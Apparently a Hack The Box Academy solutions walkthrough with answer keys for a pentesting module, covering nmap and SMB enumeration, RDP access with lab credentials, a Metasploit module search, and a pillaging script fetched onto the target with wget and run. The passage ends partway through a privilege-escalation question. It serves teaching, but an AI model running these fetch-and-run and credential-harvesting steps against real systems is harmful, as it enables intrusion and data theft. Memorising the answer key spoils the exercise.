Answer: `HTB{kXjCFCRfXDHN3EcJ3kAq2Wu4ZWdJ3jeQpnJWMLwGBi}`

# Linux Pillaging

## Question 2

### "What is the CPU architecture on the target system?"

Students will use the `uname` command to print the processor type by specifying the `-p` parameter:

Code: shell

```shell
uname -p
```

```
root@ubuntu:/home/john# uname -p

{hidden}
```

Answer: `x86_64`

# Linux Pillaging

## Question 3

### "Which version of vsftpd is installed on the target system? (Format: x.y.z)"

Students will use the package manager (`dpkg`) and grep for the `vsftpd` package to obtain the version installed on the target:

Code: shell

```shell
dpkg --list | grep vsftpd
```

```
root@ubuntu:/home/john# dpkg --list | grep vsftpd
rc  vsftpd                                     {hidden}-0ubuntu1.1                        amd64        lightweight, efficient FTP server written for security
```

Answer: `3.0.5`

# Linux Pillaging

## Question 4

### "How many SUID/GUID binaries have been found with the linpill.sh script?"

Students will open a new terminal tab and download the `pentest-in-a-nutshell.zip` archive from the `Resources` of the module, unzip it, and start a Python3 HTTP Server:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/resources/pentest-in-a-nutshell.zip; unzip pentest-in-a-nutshell.zip; dos2unix linpill.sh; python3 -m http.server
```

```
┌─[eu-academy-5]─[10.10.14.60]─[htb-ac-8414@htb-3pnfwlbxoi]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/resources/pentest-in-a-nutshell.zip; unzip pentest-in-a-nutshell.zip; dos2unix linpill.sh; python3 -m http.server

--2025-03-20 04:32:45--  https://academy.hackthebox.com/storage/resources/pentest-in-a-nutshell.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 109.176.239.70, 109.176.239.69
Connecting to academy.hackthebox.com (academy.hackthebox.com)|109.176.239.70|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 70349 (69K) [application/zip]
Saving to: ‘pentest-in-a-nutshell.zip’

pentest-in-a-nutshell.zip   100%[========================================>]  68.70K  --.-KB/s    in 0.001s  

2025-03-20 04:32:45 (54.9 MB/s) - ‘pentest-in-a-nutshell.zip’ saved [70349/70349]

Archive:  pentest-in-a-nutshell.zip
  inflating: Assigned_PT_DRAFT.docx  
  inflating: linpill.sh              
  inflating: winpill.ps1             
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Next, students will return to the SSH session and will download the `linpill.sh` bash script using `wget`:

Code: shell

```shell
wget http://PWNIP:8000/linpill.sh
```

```
root@ubuntu:/home/john# wget http://10.10.14.60:8000/linpill.sh

--2025-03-20 09:33:50--  http://10.10.14.60:8000/linpill.sh
Connecting to 10.10.14.60:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7973 (7.8K) [text/x-sh]
Saving to: ‘linpill.sh’

linpill.sh                  100%[========================================>]   7.79K  --.-KB/s    in 0s      

2025-03-20 09:33:50 (17.3 MB/s) - ‘linpill.sh’ saved [7973/7973]
```

Students will execute the `linpill.sh` bash script and will obtain the number of installed binaries with `SUID/GUID` permissions:

Code: shell

```shell
bash linpill.sh
```

```
root@ubuntu:/home/john# bash linpill.sh

<SNIP>

=== Summary of Key Findings ===
Interesting Files Found: 28769
Sensitive Files Found: 2
Writable PATH Directories: 1
SUID/SGID Binaries: {hidden}
Pillaging complete. All data saved to /tmp/Pillaging_ubuntu_2025-03-20_09-41-22
Completed at: 2025-03-20 09:41:41
```

Answer: `55`

# Windows Information Gathering

## Question 1

### "How many TCP ports in total are open on the Windows target?"

After spawning the target, students will open a terminal and will start an `nmap` scan targeting all TCP ports:

Code: shell

```shell
sudo nmap -p- -sV -sC STMIP -T5 -Pn
```

```
┌─[eu-academy-5]─[10.10.14.60]─[htb-ac-8414@htb-upg2ysc9wy]─[~]
└──╼ [★]$ sudo nmap -p- -sV -sC 10.129.255.103 -T5 -Pn

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-20 06:23 CDT
Nmap scan report for 10.129.255.103
Host is up (0.0087s latency).
Not shown: 65516 closed tcp ports (reset)
PORT      STATE SERVICE        VERSION
22/tcp    open  ssh            OpenSSH for_Windows_9.5 (protocol 2.0)
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds   Windows Server 2019 Standard 17763 microsoft-ds
3000/tcp  open  ppp?
| fingerprint-strings: 
|   GenericLines, Help: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=1aebbb64092f65f6; Path=/; HttpOnly
|     Set-Cookie: _csrf=0FN6JijADbP28uTjTrOz6Xta5046MTc0MjQ2OTgwNTMwOTYwMzUwMA; Path=/; Expires=Fri, 21 Mar 2025 11:23:25 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 20 Mar 2025 11:23:25 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title> Cube Case Gitea </title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <meta name="theme-color" content="#6cc644">
|     <meta name="author" content="Gitea - Git with a cup of tea" />
|     <meta name="description" content="Gitea (Git with a cup of tea) is a painless self-hosted
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=b7eef19cc5f93b38; Path=/; HttpOnly
|     Set-Cookie: _csrf=DBERJXhVwlMnVg_2hneMn9_qI4M6MTc0MjQ2OTgxMDM3ODE4NDIwMA; Path=/; Expires=Fri, 21 Mar 2025 11:23:30 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 20 Mar 2025 11:23:30 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Page Not Found - Cube Case Gitea </title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <meta name="theme-color" content="#6cc644">
|     <meta name="author" content="Gitea - Git with a cup of tea" />
|_    <meta name="description" content="Gitea (Git with a cup of tea) is
3389/tcp  open  ms-wbt-server  Microsoft Terminal Services
|_ssl-date: 2025-03-20T11:25:10+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=WIN01
| Not valid before: 2025-02-22T20:56:06
|_Not valid after:  2025-08-24T20:56:06
| rdp-ntlm-info: 
|   Target_Name: WIN01
|   NetBIOS_Domain_Name: WIN01
|   NetBIOS_Computer_Name: WIN01
|   DNS_Domain_Name: WIN01
|   DNS_Computer_Name: WIN01
|   Product_Version: 10.0.17763
|_  System_Time: 2025-03-20T11:25:02+00:00
5985/tcp  open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2025-03-20T11:25:10+00:00; -1s from scanner time.
| tls-alpn: 
|_  http/1.1
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=LOGGING-VM
| Subject Alternative Name: DNS:LOGGING-VM
| Not valid before: 2024-07-15T08:46:58
|_Not valid after:  2025-07-15T09:06:58
8000/tcp  open  ssl/http       Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=VelociraptorServer/organizationName=Velociraptor
| Subject Alternative Name: DNS:VelociraptorServer, DNS:VelociraptorServer
| Not valid before: 2024-09-02T12:20:15
|_Not valid after:  2034-08-31T12:20:15
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
8889/tcp  open  ssl/ddi-tcp-2?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=VelociraptorServer/organizationName=Velociraptor
| Subject Alternative Name: DNS:VelociraptorServer, DNS:VelociraptorServer
| Not valid before: 2024-09-02T12:20:15
|_Not valid after:  2034-08-31T12:20:15
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /app/index.html
|     Date: Thu, 20 Mar 2025 11:24:02 GMT
|     Content-Length: 38
|     href="/app/index.html">Found</a>.
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /app/index.html
|     Date: Thu, 20 Mar 2025 11:23:36 GMT
|     Content-Length: 38
|     href="/app/index.html">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 302 Found
|     Location: /app/index.html
|     Date: Thu, 20 Mar 2025 11:23:36 GMT
|_    Content-Length: 0
47001/tcp open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc          Microsoft Windows RPC
49665/tcp open  msrpc          Microsoft Windows RPC
49666/tcp open  msrpc          Microsoft Windows RPC
49667/tcp open  msrpc          Microsoft Windows RPC
49668/tcp open  msrpc          Microsoft Windows RPC
49669/tcp open  msrpc          Microsoft Windows RPC
49670/tcp open  msrpc          Microsoft Windows RPC
49671/tcp open  msrpc          Microsoft Windows RPC
```

Answer: `19`

# Windows Information Gathering

## Question 2

### "What is the hostname of the Windows target?"

Students will scrutinize the results from the Nmap scan to find the name of the target machine, which can be found in the result of the `3389` RDP port:

```
┌─[eu-academy-5]─[10.10.14.60]─[htb-ac-8414@htb-upg2ysc9wy]─[~]
└──╼ [★]$ sudo nmap -p- -sV -sC 10.129.255.103 -T5 -Pn

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-20 06:23 CDT
Nmap scan report for 10.129.255.103
Host is up (0.0087s latency).
Not shown: 65516 closed tcp ports (reset)
PORT      STATE SERVICE        VERSION

<SNIP>

3389/tcp  open  ms-wbt-server  Microsoft Terminal Services
|_ssl-date: 2025-03-20T11:25:10+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=WIN01
| Not valid before: 2025-02-22T20:56:06
|_Not valid after:  2025-08-24T20:56:06
| rdp-ntlm-info: 
|   Target_Name: {hidden}

<SNIP>
```

Answer: `WIN01`

# Windows Information Gathering

## Question 3

### "What is the version of Gitea running on the Windows target?"

Students will use `cURL` to obtain the version of Gitea running on the target:

Code: shell

```shell
curl -s http://STMIP:3000 | grep -i version
```

```
┌─[eu-academy-5]─[10.10.14.60]─[htb-ac-8414@htb-upg2ysc9wy]─[~]
└──╼ [★]$ curl -s http://10.129.102.200:3000 | grep -i version

			Powered by Gitea Version: {hidden} Page: <strong>1ms</strong> Template: <strong>0ms</strong>
			<span class="version">Go1.14.8</span>
```

Answer: `1.12.4`

# Windows Information Gathering

## Question 4

### "How many shares can you see on the Windows target?"

Students will use `netexec` and the `smb` protocol with the credentials `anonymous:anonymous` alongside the `--shares` parameter to obtain the number of shares on the target:

Code: shell

```shell
netexec smb STMIP -u anonymous -p anonymous --shares
```

```
┌─[eu-academy-5]─[10.10.14.60]─[htb-ac-8414@htb-upg2ysc9wy]─[~]
└──╼ [★]$ netexec smb 10.129.102.200 -u anonymous -p anonymous --shares

SMB         10.129.102.200  445    WIN01            [*] Windows Server 2019 Standard 17763 x64 (name:WIN01) (domain:WIN01) (signing:False) (SMBv1:True)
SMB         10.129.102.200  445    WIN01            [+] WIN01\anonymous:anonymous 
SMB         10.129.102.200  445    WIN01            [*] Enumerated shares
SMB         10.129.102.200  445    WIN01            Share           Permissions     Remark
SMB         10.129.102.200  445    WIN01            -----           -----------     ------
SMB         10.129.102.200  445    WIN01            ADMIN$                          Remote Admin
SMB         10.129.102.200  445    WIN01            C$                              Default share

<SNIP>                       
```

Answer: `4`

# Windows Information Gathering

## Question 5

### "What is the name of the non-standard share?"

Students will scrutinize the output from the `netexec` command to find the name of the non-standard share:

```
┌─[eu-academy-5]─[10.10.14.60]─[htb-ac-8414@htb-upg2ysc9wy]─[~]
└──╼ [★]$ netexec smb 10.129.102.200 -u anonymous -p anonymous --shares

SMB         10.129.102.200  445    WIN01            [*] Windows Server 2019 Standard 17763 x64 (name:WIN01) (domain:WIN01) (signing:False) (SMBv1:True)
SMB         10.129.102.200  445    WIN01            [+] WIN01\anonymous:anonymous 
SMB         10.129.102.200  445    WIN01            [*] Enumerated shares
SMB         10.129.102.200  445    WIN01            Share           Permissions     Remark
SMB         10.129.102.200  445    WIN01            -----           -----------     ------
SMB         10.129.102.200  445    WIN01            ADMIN$                          Remote Admin
SMB         10.129.102.200  445    WIN01            C$                              Default share

<SNIP>                       
```

Answer: `Devs`

# Windows Initial Access

## Question 1

### "What is the hostname of the file server that you discovered in the PowerShell script?"

After spawning the target, students will open a terminal and use `netexec` to enumerate the SMB shares with the provided credentials in the section `john:SuperSecurePass123` using the `spider_plus` module:

Code: shell

```shell
netexec smb STMIP -u john -p SuperSecurePass123 -M spider_plus
```

```
┌─[eu-academy-5]─[10.10.14.73]─[htb-ac-8414@htb-tcm053nhxk]─[~]
└──╼ [★]$ netexec smb 10.129.211.107 -u john -p SuperSecurePass123 -M spider_plus

[*] Copying default configuration file
SMB         10.129.211.107  445    WIN01            [*] Windows Server 2019 Standard 17763 x64 (name:WIN01) (domain:WIN01) (signing:False) (SMBv1:True)
SMB         10.129.211.107  445    WIN01            [+] WIN01\john:SuperSecurePass123
SPIDER_PLUS 10.129.211.107  445    WIN01            [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.211.107  445    WIN01            [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.211.107  445    WIN01            [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.211.107  445    WIN01            [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.211.107  445    WIN01            [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.211.107  445    WIN01            [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.211.107  445    WIN01            [*]  OUTPUT_FOLDER: /tmp/nxc_hosted/nxc_spider_plus
SMB         10.129.211.107  445    WIN01            [*] Enumerated shares
SMB         10.129.211.107  445    WIN01            Share           Permissions     Remark
SMB         10.129.211.107  445    WIN01            -----           -----------     ------
SMB         10.129.211.107  445    WIN01            ADMIN$                          Remote Admin
SMB         10.129.211.107  445    WIN01            C$                              Default share
SMB         10.129.211.107  445    WIN01            Devs            READ,WRITE  
SMB         10.129.211.107  445    WIN01            IPC$                            Remote IPC
SPIDER_PLUS 10.129.211.107  445    WIN01            [+] Saved share-file metadata to "/tmp/nxc_hosted/nxc_spider_plus/10.129.211.107.json".
SPIDER_PLUS 10.129.211.107  445    WIN01            [*] SMB Shares:           4 (ADMIN$, C$, Devs, IPC$)
SPIDER_PLUS 10.129.211.107  445    WIN01            [*] SMB Readable Shares:  1 (Devs)
SPIDER_PLUS 10.129.211.107  445    WIN01            [*] SMB Writable Shares:  1 (Devs)
SPIDER_PLUS 10.129.211.107  445    WIN01            [*] Total folders found:  0
SPIDER_PLUS 10.129.211.107  445    WIN01            [*] Total files found:    1
SPIDER_PLUS 10.129.211.107  445    WIN01            [*] File size average:    1.12 KB
SPIDER_PLUS 10.129.211.107  445    WIN01            [*] File size min:        1.12 KB
SPIDER_PLUS 10.129.211.107  445    WIN01            [*] File size max:        1.12 KB
```

Next, students will go through the generated JSON results to find a single `.ps1` file in the `Devs` share:

Code: shell

```shell
cat /tmp/nxc_hosted/nxc_spider_plus/STMIP.json
```

```
┌─[eu-academy-5]─[10.10.14.73]─[htb-ac-8414@htb-tcm053nhxk]─[~]
└──╼ [★]$ cat /tmp/nxc_hosted/nxc_spider_plus/10.129.211.107.json 

{
    "Devs": {
        "tmp.ps1": {
            "atime_epoch": "2025-02-23 15:32:29",
            "ctime_epoch": "2025-02-23 15:27:53",
            "mtime_epoch": "2025-02-23 15:32:29",
            "size": "1.12 KB"
        }
    }
}
```

Subsequently, students will use `netexec` to download the file locally through the SMB service from the `Devs` share:

Code: shell

```shell
netexec smb STMIP -u john -p SuperSecurePass123 --share Devs --get-file tmp.ps1 tmp.ps1
```

```
┌─[eu-academy-5]─[10.10.14.73]─[htb-ac-8414@htb-tcm053nhxk]─[~]
└──╼ [★]$ netexec smb 10.129.211.107 -u john -p SuperSecurePass123 --share Devs --get-file tmp.ps1 tmp.ps1

SMB         10.129.211.107  445    WIN01            [*] Windows Server 2019 Standard 17763 x64 (name:WIN01) (domain:WIN01) (signing:False) (SMBv1:True)
SMB         10.129.211.107  445    WIN01            [+] WIN01\john:SuperSecurePass123 
SMB         10.129.211.107  445    WIN01            [*] Copying "tmp.ps1" to "tmp.ps1"
SMB         10.129.211.107  445    WIN01            [+] File "tmp.ps1" was downloaded to "tmp.ps1"
```

At last, students will query the contents of the `tmp.ps1` PowerShell script to find the name of the file server within the `$remoteShare` variable:

Code: shell

```shell
cat tmp.ps1
```

```
┌─[eu-academy-5]─[10.10.14.73]─[htb-ac-8414@htb-tcm053nhxk]─[~]
└──╼ [★]$ cat tmp.ps1 

# Script: CopyFileFromRemoteShare.ps1
$username = "WIN01\john"
$password = "SuperSecurePass123"  
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($username, $securePassword)

$remoteShare = "\\{hidden}\SharedFolder"
$sourceFileName = Read-Host -Prompt "File> "
$sourceFile = "$remoteShare\$sourceFileName"
$destinationFile = "C:\Temp\$sourceFileName"

<SNIP>
```

Answer: `FileServer01`

# Windows Initial Access

## Question 2

### "When was the Gitea Git Hooks RCE vulnerability disclosed? (Format: YYYY-MM-DD)"

Students will start the `msfconsole` and search for the `gitea git hook` to find the disclosure date in the respective column:

Code: shell

```shell
msfconsole -q
search gitea git hook
```

```
┌─[eu-academy-5]─[10.10.14.73]─[htb-ac-8414@htb-tcm053nhxk]─[~]
└──╼ [★]$ msfconsole -q

[msf](Jobs:0 Agents:0) >> search gitea git hook

Matching Modules
================

   #  Name                                    Disclosure Date  Rank       Check  Description
   -  ----                                    ---------------  ----       -----  -----------
   0  exploit/multi/http/gitea_git_hooks_rce  {hidden}       excellent  Yes    Gitea Git Hooks Remote Code Execution
   1    \_ target: Unix Command               .                .          .      .
   2    \_ target: Linux Dropper              .                .          .      .
   3    \_ target: Windows Command            .                .          .      .
   4    \_ target: Windows Dropper            .                .          .      .

<SNIP>
```

Answer: `2020-10-07`

# Windows System Enumeration

## Question 1

### "What is the task name that repeats every 2 minutes? (Format: <name>)"

After spawning the target, students will open a terminal and establish an RDP session using `xfreerdp` and the `john:SuperSecurePass123` credentials:

Code: shell

```shell
xfreerdp /v:STMIP /u:john /p:SuperSecurePass123 /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.73]─[htb-ac-8414@htb-j2gy0vfjvj]─[~]
└──╼ [★]$ xfreerdp /v:10.129.43.164 /u:john /p:SuperSecurePass123 /dynamic-resolution

[01:59:02:254] [84104:84105] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-8414/.config/freerdp
[01:59:02:254] [84104:84105] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-8414/.config/freerdp/certs]
[01:59:02:254] [84104:84105] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-8414/.config/freerdp/server]
[01:59:02:300] [84104:84105] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[01:59:02:300] [84104:84105] [WARN][com.freerdp.crypto] - CN = WIN01
[01:59:02:300] [84104:84105] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[01:59:02:301] [84104:84105] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[01:59:02:301] [84104:84105] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[01:59:02:301] [84104:84105] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.43.164:3389) 
[01:59:02:301] [84104:84105] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[01:59:02:301] [84104:84105] [ERROR][com.freerdp.crypto] - Common Name (CN):
[01:59:02:301] [84104:84105] [ERROR][com.freerdp.crypto] - 	WIN01
[01:59:02:301] [84104:84105] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.43.164:3389 (RDP-Server):
	Common Name: WIN01
	Subject:     CN = WIN01
	Issuer:      CN = WIN01
	Thumbprint:  ee:cc:0b:a1:94:aa:e5:b5:cf:86:62:bf:c8:e8:05:bc:af:62:8a:cd:4b:51:1b:03:17:2b:46:54:56:8b:01:2c
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will use the search functionality pinned to the taskbar and search for `Task Scheduler`:

![[HTB Solutions/Others/z. images/c78443f36bf97a74bd0b6d0b708a75c8_MD5.jpg]]

Students will be prompted by the UAC (User Account Control) to verify their identity by tasked of submitting the `SuperSecurePass123` password:

![[HTB Solutions/Others/z. images/b4b4552a2e676b3a9b6e3b702a85d90c_MD5.jpg]]

Subsequently, students will navigate to `Task Scheduler Library` where they will find the name of the task running every two minutes:

![[HTB Solutions/Others/z. images/e5db1801b177301f399d6413a3a939a3_MD5.jpg]]

Answer: `CorpBackupAgent`

# Windows System Enumeration

## Question 2

### "What is the SID of the user "john"?"

Students will open PowerShell and use the `whoami /all` command to obtain the SID of the user `john`:

Code: powershell

```powershell
whoami /all
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\john> whoami /all

USER INFORMATION
----------------

User Name  SID
========== =============================================
win01\john {hidden}

<SNIP>
```

Answer: `S-1-5-21-481531802-3248398329-2133938904-1002`

# Windows System Enumeration

## Question 3

### "What is the exact OS Version that WinPEAS delivers?"

Students will scrutinize the output of `winPEAS` within the section to find the OS version present on the target:

![[HTB Solutions/Others/z. images/020432d5cf525bdeb707cbcd7f21c066_MD5.jpg]]

Answer: `10.0.17763 N/A Build 17763`

# Windows System Enumeration

## Question 4

### "How many hotfixes are installed on the Windows target?"

Within the same `winPEAS` output, students will find the number of hotfixes installed on the Windows target:

![[HTB Solutions/Others/z. images/5d90277e95109ea9b3c92a485fa61bdd_MD5.jpg]] Answer: `5`

# Windows Vulnerability Assessment

## Question 1

### "What is the content of the first line in the healthcheck.log file on the Windows target?"

After spawning the target, students will open a terminal and establish an RDP session using the credentials `john:SuperSecurePass123`:

Code: shell

```shell
xfreerdp /v:STMIP /u:john /p:SuperSecurePass123 /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.73]─[htb-ac-8414@htb-lhsno9vwqd]─[~]
└──╼ [★]$ xfreerdp /v:10.129.231.146 /u:john /p:SuperSecurePass123 /dynamic-resolution

[04:35:41:542] [8903:8904] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-8414/.config/freerdp
[04:35:41:542] [8903:8904] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-8414/.config/freerdp/certs]
[04:35:41:542] [8903:8904] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-8414/.config/freerdp/server]
[04:35:41:606] [8903:8904] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[04:35:41:607] [8903:8904] [WARN][com.freerdp.crypto] - CN = WIN01
[04:35:41:607] [8903:8904] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[04:35:41:608] [8903:8904] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[04:35:41:608] [8903:8904] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[04:35:41:608] [8903:8904] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.231.146:3389) 
[04:35:41:608] [8903:8904] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[04:35:41:608] [8903:8904] [ERROR][com.freerdp.crypto] - Common Name (CN):
[04:35:41:608] [8903:8904] [ERROR][com.freerdp.crypto] - 	WIN01
[04:35:41:608] [8903:8904] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.231.146:3389 (RDP-Server):
	Common Name: WIN01
	Subject:     CN = WIN01
	Issuer:      CN = WIN01
	Thumbprint:  ee:cc:0b:a1:94:aa:e5:b5:cf:86:62:bf:c8:e8:05:bc:af:62:8a:cd:4b:51:1b:03:17:2b:46:54:56:8b:01:2c
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students open PowerShell, navigate to the `C:\ProgramData\CorpBackup\Logs` directory, and query the contents of the `healthcheck.log` log file:

Code: powershell

```powershell
cd C:\ProgramData\CorpBackup\Logs
Get-Content .\healthcheck.log -TotalCount 1
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\john> cd C:\ProgramData\CorpBackup\Logs
PS C:\ProgramData\CorpBackup\Logs> Get-Content .\healthcheck.log -TotalCount 1

{hidden}
```

Answer: `Backup prep completed.`

# Windows Privilege Escalation

## Question 1

### "What does the "backupprep.ps1" script measures? (Format: two words)"

After spawning the target, students will open a terminal and establish an RDP session using the credentials `john:SuperSecurePass123`:

Code: shell

```shell
xfreerdp /v:STMIP /u:john /p:SuperSecurePass123 /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.73]─[htb-ac-8414@htb-7jwghljrhs]─[~]
└──╼ [★]$ xfreerdp /v:10.129.66.244 /u:john /p:SuperSecurePass123 /dynamic-resolution

[04:57:13:707] [7452:7453] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-8414/.config/freerdp
[04:57:13:707] [7452:7453] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-8414/.config/freerdp/certs]
[04:57:13:707] [7452:7453] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-8414/.config/freerdp/server]
[04:57:14:766] [7452:7453] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[04:57:14:766] [7452:7453] [WARN][com.freerdp.crypto] - CN = WIN01
[04:57:14:767] [7452:7453] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[04:57:14:769] [7452:7453] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[04:57:14:769] [7452:7453] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[04:57:14:769] [7452:7453] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.66.244:3389) 
[04:57:14:769] [7452:7453] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[04:57:14:769] [7452:7453] [ERROR][com.freerdp.crypto] - Common Name (CN):
[04:57:14:769] [7452:7453] [ERROR][com.freerdp.crypto] - 	WIN01
[04:57:14:769] [7452:7453] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.66.244:3389 (RDP-Server):
	Common Name: WIN01
	Subject:     CN = WIN01
	Issuer:      CN = WIN01
	Thumbprint:  ee:cc:0b:a1:94:aa:e5:b5:cf:86:62:bf:c8:e8:05:bc:af:62:8a:cd:4b:51:1b:03:17:2b:46:54:56:8b:01:2c
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open PowerShell and query the contents of the `backupprep.ps1` PowerShell script located in the `C:\ProgramData\CorpBackup\Scripts` directory:

Code: powershell

```powershell
cat C:\ProgramData\CorpBackup\Scripts\backupprep.ps1
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\john> cat C:\ProgramData\CorpBackup\Scripts\backupprep.ps1

# CorpBackup Health Check Script

$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

"System health check at $timestamp - CPU Usage: $(Get-CimInstance Win32_Processor | Measure-Object -Property LoadPercentage -Average | Select-Object -ExpandProperty Average)%" | Out-File "$logDir\healthcheck.log" -Append

"Backup prep completed." | Out-File "C:\ProgramData\CorpBackup\Logs\healthcheck.log" -Append
```

Students will notice the string `System health check at %timestamp - CPU Usage`, which means the script is measuring `CPU Usage`.

Answer: `CPU Usage`

# Windows Privilege Escalation

## Question 2

### "What type of attack was being used to escalate the privileges in the above example? (Format: two words)"

